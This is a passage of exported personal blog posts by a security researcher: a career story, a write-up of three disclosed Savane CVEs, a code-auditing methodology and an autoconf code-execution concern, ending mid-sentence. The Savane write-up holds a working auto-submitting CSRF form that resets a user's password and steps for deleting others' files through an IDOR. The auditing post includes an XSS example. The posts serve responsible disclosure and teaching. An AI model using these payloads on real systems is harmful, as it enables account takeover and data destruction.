[{"content":"Author\u0026rsquo;s note: This article was initially published on Synack\u0026rsquo;s README. They have great content and I recommend that you browse their articles if you are interested cybersecurity.\nEditor\u0026rsquo;s note: This post from Ally Petitt describes her journey towards earning the vaunted OSCP at 16 \u0026gt; and being an active part of the Synack Red Team at 17. Check out Ally\u0026rsquo;s blog for more of her write-ups \u0026gt; on vulnerabilities she\u0026rsquo;s discovered, hacking techniques and more.\nLife before coding I was 3 years old when I first declared I was going to be a doctor, my mother told me. When I was 8, I had finally done enough chores around the house to earn $20, and I deposited the total into a college fund. I was 9 years old when I began secretly staying up past my bedtime to read the human anatomy textbook from my father’s bookshelf. When I was 10 I set my sights on getting admitted to Harvard Medical School and becoming a neurosurgeon. This was also the year that I attempted surgery on my arm with a pencil to see what the different layers of skin looked like. As expected from a fifth grader, this was done without anesthesia and, yes, it got infected. When I was 13, however, I survived a global pandemic and that all changed, setting me on a path that would ultimately see me earn my OffSec Certified Professional (OSCP) certification and get my first CVEs as an ethical hacker.\nWith COVID-19 came remote school, which meant the schoolwork that took approximately seven hours on campus could now be completed in 40 minutes from my own room. Without the increased time commitment of fixed class periods, I was now free to explore education on my own, without a syllabus or any restrictions.\nI began to ask questions that I had never allowed myself the freedom to ask previously. Becoming a doctor is a prestigious profession. But when I researched the burnout, the relentless schedules, rigorous schooling, student debt and stress that these essential workers experience, I realized a doctor’s lifestyle would not be a good fit for me.\nDoubts about a career as a doctor led to more questions. I used the internet to learn subjects that my middle school didn’t offer: economics, physics, investing, astronomy, trigonometry, neuroscience and Russian. I noticed a trend that I was drawn towards career options that included themes of learning, making connections and investigation. I considered becoming a theoretical physicist, an investigative journalist and many more professions. While enticing, there were aspects of each that made me wary of committing to them.\nThis brings me to December 2020, the month that I ran an experiment to test the coding ability I could attain in only 20 hours of learning. I wanted to see what I was capable of and I did not expect how humbling it would be. I recall that my first five or six hours were spent attempting to troubleshoot my Python installation. The next three were me trying to figure out why my “Hello World” program was not running in VSCode. (It turned out that I had forgotten the “.py” file extension.) By the end of the 20 hours, however, I had gotten the basics of coding down and was able to create simple projects such as mad-libs. I decided to continue for another week and completed a terminal-based tic-tac-toe game. This was a career trajectory I could see myself in.\nLife after coding to OSCP I built a humble portfolio of coding projects and within three months landed an internship as a software engineer. Navigating this new environment with my new team was a challenge. I was tasked with writing a Java API to take input from a machine learning backend and utilize it to spin up EC2 spot instances (or their equivalent) across three different cloud providers. I took the responsibility of independently learning Java so that I could better contribute to the project. It was also at this time that I began to share resources and techniques with my teammates who were struggling. I began to assist in delegating tasks and working with everyone’s schedule. Because of this, I was promoted to team lead two months after joining.\nFast-forward 1.5 years, I had purchased and built my own PC and served in three internships where I authored programs to decrease website load time by 2 seconds, parse 2,212 PDFs, save 70% of company expenses on cloud computing, scrape and preserve five critical websites, and I designed and developed a company website from scratch.\nDespite the seemingly rapid success, I had received hundreds of rejections on the basis of my youth, which I tracked on a spreadsheet. I became extremely discouraged due to the limited opportunities available at 16 and considered giving up.\nAfter deliberate thought, I decided that if I was going to give up, it would be for a reason other than self-doubt or fear. I shifted my focus to what I could do instead of what I couldn’t. I forged ahead, reaching a total of 985 GitHub commits by the end of 2022.\nI continued to seek out experience and opportunities in software engineering. During my third software engineering internship, I developed a deeper interest in how wireless communication worked, and whether knowing how to code really meant that I could hack into a router like I used to think (spoiler: it does not).\nMy cybersecurity journey began by reviewing entry-level TryHackMe modules and learning the basics of networking. It had occurred to me that the OSCP would be a far-reaching certification to obtain, especially with its prestige and notoriety, however, with the limitations that my age had already offered me, I was skeptical in believing that I could obtain it. After further investigation, however, I found that achieving the OSCP at 16 had been done at least once before!\nWith the money I had saved from that internship, I purchased an exam voucher for the OSCP and began my lengthy process of consistent and deliberate preparation over a period of approximately seven months. This story can be found on my personal blog.\nEarning the OSCP meant more to me than the opportunities it afforded me. It was a symbol of my relentless desire to follow through with the goals that I set for myself and persevere through crippling levels of self-doubt. The OSCP, however, was just the beginning of my journey into infosec.\nExperience (the city, Synack, CVE and data breach) I learned of an opportunity to intern at the City of Bakersfield over the summer for clerical positions, however, I was interested in a more technical pathway. I found that the city had a job opening for a security analyst. I applied with a flicker of hope that I could help to fill that role during my internship. In the interview process, I explained that I would be willing to take on some of the responsibilities of the analyst as an intern. Shortly thereafter, a thick packet about me was placed on the desk of my future supervisor and he decided to give me an opportunity.\nDespite having obtained the OSCP at such an early age, my imposter syndrome was still present. I had come to believe that once I achieved more success, I would have less imposter syndrome, however, in practice, I found that it only became more severe. Now, with the opportunity to work for the city, I was face-to-face with my own self-doubts.\nUltimately, I took my responsibilities one step at a time. I fell back on my methodology. First, scanning the hundreds of hosts within scope. Then, looking for low-hanging fruits and subsequently narrowing my focus to more granular details, taking thorough notes as I went.\nUpon my first external penetration test at the city, I was manually testing Click2Gov when I noticed an ID being sent in one of the POST requests that I intercepted in my HTTP proxy. I created a second account and tested that this ID could be modified to be that of another user to make changes to another user’s account. My hypothesis was proven correct, and thus, I had discovered CVE-2023-40362. Additionally, I discovered an insecure direct object reference (IDOR) and multiple cross-site scripting (XSS) vulnerabilities that were more complex to exploit. Following these discoveries, I corresponded with Central Square in order to responsibly disclose the issues so they could be patched. Months later, after a patch was shipped, I publicized the CVE. The vendor then added a reference to the CVE correlating the vulnerability I found to a Click2Gov data breach affecting 300,000 people that led to a class-action lawsuit. I was absolutely shocked that something I found would be associated with such big news.\nAfter this assessment, I did an internal security audit on our printers, where I made the revolutionary discovery that adding a “test.txt” file to the printer’s FTP server would cause that file to print. My co-workers were very confused as to why the word “test” was repeatedly printing when they went to collect their papers until I realized what was happening. Additionally, I helped to extract the password hashes of our municipal enterprise domain containing thousands of accounts, cracking as many as I could to demonstrate the strength of our passwords. Finally, I audited our Active Directory domain, mapping out potential privilege escalation paths that could be used by attackers. These four assessments were completed in the span of only six weeks.\nAfter my term at the city concluded, I continued to perform independent research, leading to the discovery of CVE-2023-43154 and CVE-2023-44792, which were authentication bypass and SQL injection vulnerabilities, respectively. In December 2023, I discovered CVE-2024-27630, CVE-2024-27631 and CVE-2024-27632 in Savane, the web-based software hosting system used by the Savannah bug tracker. It coordinates bug-related information in 405 official GNU projects that have been estimated to be used by millions of people worldwide.\nBy now, I was beginning to gain more confidence in my abilities as an offensive security professional. I began to apply to more job openings, starting with Synack, where I was grateful to have the opportunity to join the Synack Red Team (SRT) of security researchers.\nSQLi WAF bypass Being surrounded by so many knowledgeable security researchers really allowed me to grow my own skills. Two weeks into working for the SRT, I discovered an intriguing authentication bypass flaw. Recently, I discovered a SQL injection vulnerability – however, my SQLi payloads were being monitored by a reputable firewall. I attempted different techniques and bypasses for several days before eventually running out of ideas.\nLuckily, I didn’t have to go it alone: I partnered with SRT members Moey and NukeDX in order to construct an initial payload to validate the SQL injection. From there, Moey – who happens to have also joined the SRT at a young age – and I tested the firewall for hours. We tested payloads in online SQL editor sandboxes and read through documentation to find different ways to accomplish data exfiltration. While we were unable to find a payload to extract all the data, we crafted a payload to extract part of it by turning our traditional SQLi into a boolean attack. From there, we brute-forced our way into demonstrating impact with the vulnerability.\nConclusion As a current senior in high school, balancing school life with my professional aspirations has been a persistent challenge, however, it is an immensely rewarding journey. Ultimately, my success thus far is a product of the individuals who saw potential in me and gave me a chance or simply a listening ear. In my continuous mission to learn and contribute to this industry, I plan to research more open-source projects, firmware, and otherwise intriguing cyber assets in addition to obtaining more technical certifications in my transition from high school to a career in security research. Although this scar on my arm from my self-imposed “surgery” is fading, its symbolism remains eternal as it represents the insatiable curiosity and unwavering perseverance that has led me to discover and thrive in a field that I am proud to be a part of.\n","permalink":"https://ally-petitt.com/en/posts/2024-05-07_how-i-became-a-hacker-before-i-finished-high-school/","summary":"Author\u0026rsquo;s note: This article was initially published on Synack\u0026rsquo;s README. They have great content and I recommend that you browse their articles if you are interested cybersecurity.\nEditor\u0026rsquo;s note: This post from Ally Petitt describes her journey towards earning the vaunted OSCP at 16 \u0026gt; and being an active part of the Synack Red Team at 17. Check out Ally\u0026rsquo;s blog for more of her write-ups \u0026gt; on vulnerabilities she\u0026rsquo;s discovered, hacking techniques and more.","title":"How I became a hacker before I finished high school [Repost]"},{"content":" Introduction Hello everyone and welcome to the first exclusive post on my new personal website! I am very excited to be here and I hope that you are as well. The picture above is a bit dramatic, but communicates the message that I have decided to move forward. Those who have been following me will know that I first began my technical blog on Medium, which was an approachable outlet for sharing my knowledge as I first entered the field.\nI will graduate from high school this month, which marks the beginning of a new chapter in my life. In the spirit of this transitional period of my life, I decided to make the shift from posting my technical articles on Medium to this personal website.\nThe technical details of how I migrated my blogs from Medium to here will be explained further down in this article.\nAppreciation I want to first express my gratitude for Medium and the supportive readers that the platform has allowed me to connect with. Medium is where I got my start in writing technical blogs and has been an instrumental outlet in sharing my knowledge as I was learning it.\nWhy I\u0026rsquo;m Leaving Medium With that in mind, my decision to leave Medium is multi-faceted.\nNot only am I ascending into adulthood, I am maturing into a professional career doing work that I am extremely passionate about. I wanted that increased seriousness to be reflected in the articles that I write, which is more aptly served by a personal website than Medium (even more so with a custom domain, but that is a work in progress).\nAdditionally, this website offers a more authentic experience. I have purposefully omitted analytics for the benefit of my readers\u0026rsquo; privacy. As a result, these posts are more like a conversation with interested readers than a numbers game.\nFinally, creating my own website affords me autonomy. My readers are no longer berated by banners and pop-ups to subscribe to get a Medium membership so that they can view other content on the site with the vast majority of it being pay-walled. I can provide my readers with a site that is free to access without distractions- something that I have come to appreciate in my own internet browsing.\nI also understand that I have readers that prefer stay updated with their authors through RSS feed aggregators. For you, I added an RSS feed to the site :).\nNext Steps I am excited about the future. I used to be petrified about life after graduation, but I have learned to embrace the unknown. There is so much to learn, attempt, and experience and I am at this exciting point in my life where it is all novel. There are certain topics in cybersecurity that I wish I could re-learn again for the first time because I remember the potent feelings awe and inspiration of the moment I first read about them. Here\u0026rsquo;s to a future of continued discovery.\nRegarding this blog, as I continue to perform security research and study new techniques, I plan to publish writeups or otherwise educational content. Writing will not be my main focus, so I will prioritize the articles I write based on what I find very interesting or if I think my audience would benefit from them.\nCreating This Website I was recommended the static site generator, Hugo, by a colleague who I was discussing website-building with. After setting up a Hugo app, I found appreciation in the ease of setup and its customizability and decided to build this website to completion with it.\nSince there are already a plethora of tutorials for Hugo, I will omit the initial app setup (those that are interested can view Hugo\u0026rsquo;s QuickStart Guide). Instead, I will focus on the technical challenges that were specific to this use case of converting a personal Medium blog to a Hugo-compatible markdown post.\nHow I Transferred Previous Blog Posts I had 26 published blogs on my Medium account, so transferring each manually would have taken an immense amount of time. Consequently, I used scripts to automate this process. The first was a tool developed by Oliver Ernst called medium-to-markdown. The second was a tool was developed by myself: medium-to-hugo-post.\nMy workflow involved chaining both of these scripts together such that the output directory of medium-to-markdown was the input directory of medium-to-hugo-post with /md appended. As per the README instructions on medium-to-markdown, I requested an export of my data from Medium, which I then fed into medium-to-markdown. This converted my posts into markdown with the exception of image tags and their captions.\npython3 ./medium-to-markdown/run.py convert --posts-dir ./export/posts --output-dir ./output Following the markdown conversion, I noticed that the new markdown files required additional modifications to properly format on Hugo. To remedy this, I created medium-to-hugo-post to add a \u0026ldquo;Front Matter\u0026rdquo; to each post and finalize the conversion of images and their subtitles to markdown.\npython3 ./medium-to-hugo-post/medium-to-hugo-post.py --md-dir ./output/md --posts-dir ./content/posts I outline these steps and the limitations of these tools in more detail in the medium-to-hugo-post README.md file.\nConclusion Migrating to this website is a symbol of a new beginning. I could not be more enthusiastic about this transformative period of my life as I transition into a full-time career doing the work that I love. Thank you to everyone who has supported me throughout this journey, and I can\u0026rsquo;t wait to see what the future has in store!\n","permalink":"https://ally-petitt.com/en/posts/2024-04-31_leaving-medium/","summary":"Introduction Hello everyone and welcome to the first exclusive post on my new personal website! I am very excited to be here and I hope that you are as well. The picture above is a bit dramatic, but communicates the message that I have decided to move forward. Those who have been following me will know that I first began my technical blog on Medium, which was an approachable outlet for sharing my knowledge as I first entered the field.","title":"Goodbye World - Migrating Away From Medium | Graduation \u0026 Next Steps"},{"content":" Author: Ally Petitt\nIntroduction Christmas break is notoriously refreshing for high schoolers like myself, however, unlike most high school students, I got to spend mine doing the most fascinating work in the world: security research.\nI had previously used Savannah, a GNU bug tracker, to submit a bug report, so when I noticed that the underlying technology, Savane, was open source, I knew I had to put it on my list of research projects. To my surprise, I was able to discover 3 CVEs within the span of 2 days including insecure access control, cross-site request forgery (CSRF), and a bad seed vulnerability in Savane v3.12 and prior versions.\nTesting Environment:\nFirefox v103.0 (64-bit) Debian 12, stable-slim Docker container PHP development server Note that these aren’t all-encompassing results as my short audit of this application was only over the course of a few days.\nMethodology This audit consisted of both dynamic and static analysis. The majority of my source code analysis methodology can be found here. For the sake of brevity, I will only include relevant details for this article. My first step was configuring a local development environment via a Dockerfile I created.\nWith a running instance of Savane, I shifted my focus to source code analysis, pinpointing files of particular interest for security issues including utils.php, upload.php, and users.php. While there were interesting leads, many of them did not pan out how I had hoped, so I began to parse through functionalities with more potential for impact. This led me to authenticated functionalities since any user can create an account and expands the attack surface drastically.\nAccount Management I began by assessing account management functionalities such as updating passwords and changing email addresses for Cross-Site Request Forgery (CSRF) or access control vulnerabilities since they happened to be at the forefront of my mind at the time of this audit.\nThe majority of the critical account management functionalities appeared to be protected by aform_id parameter, which contained a randomized string in each request. In effect, form_id acted as a CSRF token.\nAdditionally, attempting to change the password required the previous user password to be known, which provided no advantage over attempting to brute-force their password to begin with.\nhttp://172.17.0.2:7890/my/admin/change.php?item=password\nWith these precautions in place, it was evident that further investigation was required.\nCVE-2024–27631 — CSRF (CWE-352) I suspected that there may be additional critical vulnerabilities without CSRF protection. Specifically, I began to look inside of admin folders in the source code, eventually finding siteadmin/usergroup.php, which enabled superusers to edit of any user’s profile.\nExample of /siteadmin/usergroup.php to edit the account of user 60079\nThis page contained three unprotected functionalities of interest. The first was a function that can be used to grant a user admin flags, leading to privilege escalation without account takeover.\nfrontend/php/siteadmin/usergroup.php\nThe second and third functionalities could be leveraged for account takeover by either changing the email address of a user’s account:\nfrontend/php/siteadmin/usergroup.php\nOr, changing the password of any user’s account.\nfrontend/php/siteadmin/user_changepw.php\nGiven these promising leads, I began to develop a Proof-of-Concept (PoC) to demonstrate that the vulnerability existed in practice. (I have found that with static analysis, sometimes a detail in the code can be overlooked that actually mitigates the vulnerability.) The following is what I came up with and successfully tested:\n\u0026lt;!-- The efficacy of this payload is browser-dependent --\u0026gt; \u0026lt;form id=\u0026#34;autosubmit\u0026#34; action=\u0026#34;http://\u0026lt;savane\\_instance\u0026gt;/siteadmin/user\\_changepw.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;form\\_pw\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;Password1!\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;form\\_pw2\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;Password1!\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;user\\_id\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;\u0026lt;user\\_id\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;update\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;Update\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit Request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;autosubmit\u0026#34;).submit(); \u0026lt;/script\u0026gt; Thus, I discovered CVE-2024–27631! A patch was implemented in this commit.\nCVE-2024–27632 — Bad Seed (CWE-335) While tracing CSRF-related functionalities in the code, I came across the logic for generating and serving the CSRF tokens, or form IDs. The execution flow is as follows:\nProtected PHP pages contain a call to form_header(). The form_header() function seeds the current Unix timestamp. A random number is chosen and hashed to create form_id. The form ID is added as a hidden element in the form on the protected page. The definition of form_header() can be seen in the image below.\nfrontend/php/include/form.php\nI was particularly interested in the mechanism behind seeding the Pseudo-Random Number Generator (PRNG), which occured in utils_srand().\nfrontend/php/include/utils.php\nIt was apparent that [mt\\_srand()](https://www.php.net/manual/en/function.mt-srand.php) was used to seed the Unix timestamp (learn more about PRNGs here). Since this function is called when a protected page is loaded, the seed is renewed with the current time upon visiting the page. If the timestamp that a victim visited a page is known, can be approximated, or can be otherwise triggered, it is possible to independently generate the exact same form ID token, passing the CSRF check! This would allow for CSRF attacks on arbitrary form submissions, leading to potential account takeover.\nSavane v3.13 contains a patch implemented in this commit.\nGroup Management Functionalities Another class of functionalities I began to explore was group management. I tested CRUD (Create, Read, Update, and Delete) functionalities utilized when submitting a bug report to a group. I was unable to exploit file uploads in bug reports (I may address this in a future article if enough people are interested), however, I was vigilant on access control issues when I observed the web traffic for deleting an uploaded attachment.\nDeleting a file attachment with ID 40225\nCVE-2024–27630 — IDOR (CWE-639) Upon submitting a bug report, uploaded files are deposited in the uploads directory (/var/lib/savane/trackers_attachments) with a file name equivalent to the file’s ID.\nNaturally, I began to investigate the process of deleting a file, a function only accessible to tracker admins. The following function is responsible for handling file deletion on attachments (frontend/php/include/trackers/data.php:2417):\nfunction trackers\\_data\\_delete\\_file ($group\\_id, $item\\_id, $file\\_id) { global $sys\\_trackers\\_attachments\\_dir; # Make sure the attachment belongs to the group. $res = db\\_execute (\u0026#34; SELECT bug\\_id from \u0026#34; . ARTIFACT . \u0026#34; WHERE bug\\_id = ? AND group\\_id = ?\u0026#34;, [$item\\_id, $group\\_id] ); if (db\\_numrows ($res) \u0026lt;= 0) { # TRANSLATORS: the argument is item id (a number). $msg = sprintf ( \\_(\u0026#34;Item #%s doesn\u0026#39;t belong to project\u0026#34;), $item\\_id ); fb ($msg, 1); return; } $result = false; # Delete the attachment. if (unlink (\u0026#34;$sys\\_trackers\\_attachments\\_dir/$file\\_id\u0026#34;)) $result = db\\_execute (\u0026#34; DELETE FROM trackers\\_file WHERE item\\_id = ? AND file\\_id = ?\u0026#34;, [$item\\_id, $file\\_id] ); The user can control the $item_id and $file_id parameters through the URI. Can you spot the vulnerability? It is subtle.\nNote that there is input validation ensure the $file_id is a number. Otherwise, there would be a directory traversal vulnerability allowing for arbitrary file deletion.\nThe function first checks if the user is part of the group corresponding to the $item_id and proceeds to delete the attachment before running a SQL query updating the database. The $file_id is not checked at all! This means that as long as the attacker is an admin of the group referenced in $item_id, they could delete any file.\nI was quite surprised to have spotted this discrepency, but very pleased. The following steps can be taken to reproduce the vulnerability:\nHave an account that is an admin of a group with a bugtracker (attacker account). With a separate user account (victim), upload a file attachment in a bug report to a group that the attacker is not an admin of. A sample of the subsequent upload directory is as follows: root@60ae93fe131f:/var/lib/savane/trackers\\_attachments# ls 40226 40227 40230 40231 Visit the homepage of the group that the attacker is an admin of. Then, visit Bugs \u0026gt; Browse and note a valid Item ID on the leftmost column of the table. This ID will be used in the next step.\nAs the attacker, make a get request to the path /bugs/index.php?func=delete_file\u0026amp;item_id=\u0026lt;ATTACKER_ITEM_ID\u0026gt;\u0026amp;item_file_id=\u0026lt;FILE_ID_TO_DELETE\u0026gt;.\nIn my case, this looks like http://172.17.0.2:7890/bugs/index.php?func=delete_file\u0026item_id=50697\u0026item_file_id=40231. Verify that the victim’s file (from a group the attacker doesn’t have privileges on) has been deleted. root@60ae93fe131f:/var/lib/savane/trackers\\_attachments# ls 40226 40227 40230 Due to the incremental file names, it is possible for an attacker to iteratively delete every file attachment on the web server! Since recently uploaded files harbor the highest file ID numbers, an attacker can upload a file, observe the ID, and delete every ID below that number as one would in an Insecure Direct Object Reference (IDOR) vulnerabillity. This vulnerability was patched here.\nThanks Special thanks to Ineiev, the maintainer of Savane. He was very receptive to my responsible disclosure and helped take steps to patch it.\nConclusion Combing through Savane’s source code was one of the highlights of my Christmas break. While discovering 3 CVEs came as a surprise, I am appreciative of the educational value of this experience. I hope that you learned something from this writeup. If you have any questions or comments, feel free to reach out to me on LinkedIn!\n","permalink":"https://ally-petitt.com/en/posts/2024-03-21_how-i-found-3-cves-in-2-days-8a135eb924d3/","summary":"Author: Ally Petitt\nIntroduction Christmas break is notoriously refreshing for high schoolers like myself, however, unlike most high school students, I got to spend mine doing the most fascinating work in the world: security research.\nI had previously used Savannah, a GNU bug tracker, to submit a bug report, so when I noticed that the underlying technology, Savane, was open source, I knew I had to put it on my list of research projects.","title":"How I Found 3 CVEs in 2 Days"},{"content":" https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIntroduction Whitebox penetration testing can be intimidating. Complex web applications may contain hundreds of thousands of lines of code and deciphering the connection between the various web components and their numerous implementations is challenging. A powerful, yet simple technique to approach the code review of such an application is to break it into manageable pieces.\nIn this article, I will be outlining a methodology that can be used to break down large web applications, such as Content Management Systems (CMSs) into manageable components that can be systematically analyzed for vulnerabilities or logic errors. This is the approach that I used to discover CVE-2023–43154 and it is the approach taught in the AWAE, OffSec’s prerequisite course to the OffSec Web Expert (OSWE) certification.\nNote that this article has an emphasis on web security, but the methodology can be applied to other fields of research as well.\nLet’s begin.\nMethodology At a high level, this methodology begins with gaining familiarity with the application as a whole. This phase includes\nIdentifying the technology stack — programming language, templating engine, database, etc.. Mapping out the application to gain a high-level overview of the structure of the project — commands like tree -L 3 may be used. Reading documentation Understanding common use cases of the application Exploring the application through its interface These steps help to develop a holistic understanding of the application. This enables you to better relate your subsequent findings to how the application is used, aiding in a more accurate assessment of impact and the likelihood of a successful exploit.\nThen, the approach can branch into either of two directions: bottom-up or top-down. To understand what this means, it is first important to define what is meant by a “source” and a “sink”. From there, it will become more clear what is meant by the aforementioned approaches.\nSources and Sinks Vulnerabilities in web applications commonly arise from the manner in which user input is handled. The entry point for user input is referred to as a source. An example of this would be input from a form, a query parameter in the URL, or a cookie. These are sources of user input that are then interpreted and handled by the web application.\nA sink, on the contrary, is where the user input is actually used. This is where the vulnerability occurs. In the case of a SQL injection, the source may be a query parameter that has contents concatenated with a SQL query.\nTo further illustrate this point, I will provide an example. The vulnerable PHP code below has a source, comment , and a sink, \u0026lt;?php echo $_GET[‘comment’]; ?\u0026gt;. The lack of sanitization on the PHP code as it echos the user input results in an XSS vulnerability.\n\u0026lt;!-- Source: https://example.com/?comment=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;div id=\u0026#34;comment\u0026#34;\u0026gt; \u0026lt;!-- Sink --\u0026gt; \u0026lt;?php echo $\\_GET[\u0026#39;comment\u0026#39;]; ?\u0026gt; \u0026lt;/div\u0026gt; For a more visual explanation, this LiveOverflow video provides an excellent demonstration of the topic.\nBottom-Up Approach The bottom-up approach refers to first locating sinks and tracing the code “upwards” to the source. For instance, I may search the code base for all occurrences of the sink system(), and from there follow the value that is passed into the function to search for any user input that may be implemented into that parameter.\nRegular expressions are a common technique to speed up the process of finding sinks. Patterns such as ^.*unserialize\\(.+\\) may be used to locate specific sinks (in this case, the unserialize() function) with more accuracy and can be used to narrow down the search effort. It is important to note, however, that this method has limitations. The regex results are only as strong as the pattern used and even well-established regular expressions can miss vulnerabilities and sinks.\nThis method is generally more tedious since not all occurrences of a sink will be used in the context of user-controlled data. Therefore, there can be more code to parse through in order to find a bug. Despite its repetitiveness, this approach has the advantage of increasing the likelihood of finding higher severity and less accessible vulnerabilities that are very difficult, if not impossible, to discover without access to the source code.\nTop-Down Approach On the contrary, the top-down approach consists of identifying sources and following their implementation in the code until a sink is found. For instance, I may submit the string “test” into a EditProfile functionality on a website. A top-down approach would consist of finding where the “test” string is received in the code and following the logic used on it until I locate its sink, or implementation, in a SQL query.\nRegular expressions can be used here as well. A basic example is ^.*?query to find query parameters. Regular expressions will typically become more complex depending on the specific context and the vulnerabilities that they are searching for.\nThis approach excels in finding vulnerabilities that are more accessible, but typically less severe. To clarify, high severity and high accessibility vulnerabilities can be discovered through either approach. One approach will simply increase your likelihood of finding a particular kind of vulnerability and the one that is chosen will depend on the individual priorities of the code review.\nFunctionality-Based Approach A different perspective on code review is breaking the application down into sections based on functionality. Instead of starting broad with all of the application’s sources or sinks and then narrowing down into a vulnerable one, this approach involves starting narrow with one functionality and learning how it works on a deeper level in order to search for vulnerabilities in that particular segment of the application.\nThis approach is particularly useful when prioritizing certain types of vulnerabilities based on factors such as required authentication level. In this instance, one can curate a list of functionalities that can be used without authentication and analyze those for vulnerabilities. Prioritization is a useful tool when auditing large code bases to increase the chances of finding higher severity vulnerabilities or medium-low severity vulnerabilities that can more elegantly be chained together to result in a higher-severity attack.\nTooling I previously mentioned that searching through the code with regular expressions can be used to quickly identify sources and sinks. In addition to this, tools such as Semgrep can also be used to grep for certain patterns in the code. Semgrep looks at the code as more than a text file. It develops and abstract syntax tree (AST) in order to better understand the semantics. This can lead to its recognition of a certain vulnerable pattern in code that a regex pattern would miss. On the other hand, both are only as strong as the way they were written and they can lead to many false positives.\nStatic Application Security Testing (SAST) solutions can also aide in identifying vulnerabilities. SpectralOps, Checkmarx, and Veracode are all examples of SAST tools used by organizations. I have not tried any of these at the time of writing, so I can not recommend one with certainty. SAST tools are generally meant for use by developers in the CI/CD pipeline, but they can also be used by researchers.\nConclusion The approach to static analysis that you use will impact the types of vulnerabilities that you are more likely and their likelihood of being exploitable. I encourage you to experiment with different approaches to static analysis and decide for yourself which methods work best for your goals. A mixed approach is quite common and even encouraged for best results.\nHappy hacking!\n","permalink":"https://ally-petitt.com/en/posts/2024-01-01_how-to-find-more-vulnerabilities---source-code-auditing-explained-2c8a10896374/","summary":"https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIntroduction Whitebox penetration testing can be intimidating. Complex web applications may contain hundreds of thousands of lines of code and deciphering the connection between the various web components and their numerous implementations is challenging. A powerful, yet simple technique to approach the code review of such an application is to break it into manageable pieces.\nIn this article, I will be outlining a methodology that can be used to break down large web applications, such as Content Management Systems (CMSs) into manageable components that can be systematically analyzed for vulnerabilities or logic errors.","title":"How to Find more Vulnerabilities — Source Code Auditing Explained"},{"content":" https://img.rasset.ie/001babea-1600.jpg\nIntroduction Linux users often take pride in their ability to compile their own code. In spite of this, a subtle yet critical attack vector has existed for over 20 years with high potential impact when exploited. Cleverly disguised within the configure.ac file, this attack vector allows malicious actors to execute code on your system before the compilation process even begins.\nWhile the absence of known exploits may lull users into a false sense of security, it is precisely this lack of awareness that makes this attack vector dangerous, increasing the chances of successful and large-scale exploitation.\nThe security concern that I am referring to is the ability to execute arbitrary code through autoconf.\nWhat is Autoconf? Traditionally, developers have used a build system in order to distribute software packages that are easy for clients to compile. These build steps are specified in a Makefile.\nDifferent systems have different requirements. Sometimes, they require different flags to be set during compilation and sometimes the compiler is referred to by a different name. With such a diverse array of systems and configurations to cater to, Autoconf was offered as a solution.\nGNU Logo\nAutoconf is a crucial part of the GNU Autotools project and it ensures that packages are portable across different systems. It accomplishes this through macros from the M4 programming language to create a shell script that configures software source code packages for the respective system (see the README for more information).\nHow Does Autoconf Work? Autoconf is one of the first commands executed when building a package that follows GNU Coding Standards (which is a lot of packages). If not called directly, it is often included in an autogen.sh script. The program uses instructions from a configure.ac file to generate a dynamic configurebash script that is responsible for matching the libraries on the system to those required in the program.\nThe Security Concern Because Autoconf interprets user-controlled input through the configure.ac file, it is possible to insert malicious code that gets executed upon the running the generated configure file.\nFurthermore, and increasingly concerning, is the possibility of obtaining code execution upon execution of the autoconf command- before the generated configure file is even ran. This means one less step in order to pwn a computer.\nFor example, hackers can embed a malicious payload within the configure.ac file and when an unsuspecting Linux user begins building the package, the attacker-controlled code would be executed on the system.\nThis can be abused to perform targeted cyberattacks on developers, general Linux users, security researchers, and more if the supply chain is compromised. Additionally, because this is not well-known, modern code-scanning and SAST solutions often fail to include checks for malicious code within configure.ac, decreasing the chance of detection.\nI discuss exactly how to exploit this in my Proof-of-Concept on GitHub, which was published after receiving permission from the Autoconf maintainers to publicly disclose my concerns.\nHow Hard Was This To Find? I want to briefly explain the ease with which I was able to uncover this potentially dangerous functionality. First, I identified the programming language being used was M4, so I read core notes for approximately 30 minutes to get a high-level overview of the language.\nAfter experimenting with the functionality and realizing that it was possible to embed bash code in the created configure script, I wondered if I could take it a step further and get code execution from running autoconf alone.\nWithin 2 hours of combing through the source code to learn how the application works, I identified 3 potential locations for code to be executed. I then created a PoC to submit in a bug report to the Autoconf maintainers.\nhttps://seeklogo.com/images/M/m4-logo-88B85DB5FB-seeklogo.com.png\nMy findings were low-hanging fruits and I suspect they have only gone this long without being abused because of the learning curve to understand M4. As you will see in the next segment, I am far from the first to know of this functionality.\nAutoconf’s Response Since 2/3 of my concerns came from a segment of legacy code that has been unused since the year 2000, one of the maintainers removed the macro in this commit and thanked me for bringing the unused code snippets to their attention.\nThey explained to me that there were plenty of opportunities to execute code when using Autoconf and that the ability to invoke macros such as m4_syscmd, allowing for code execution, was a conscious design decision as many of their users rely on that functionality. In fact, it is common for m4_syscmd to be used to run commands such as git describe.\nAnother of the points in my PoC was that they included a macro that executed the cat command without an absolute path. This made the program vulnerable to the modification of a $PATH environmental variable which could lead to execute arbitrary code execution and privilege escalation under the correct circumstances.\nThe maintainers explained that adding an absolute path to the binary would break Nix, Guix, and more. They made the assumption that Autoconf is being run in an environment with a secure $PATH within a sandbox, which is consistent with best practices. However, I have strong doubts that the majority of users actually follow these precautions.\nImplications I want to be clear that I respect the maintainers and the effort and time they have put into creating a tool that we have all benefited from. The ability to execute OS commands is not inherently dangerous, but when abused it can certainly have security implications.\nGiven the reliance on m4_syscmd by Autoconf’s clientele, it is clear to me that the maintainers have no plans of removing the functionality. The ability to execute arbitrary code upon running autoconf will remain in the 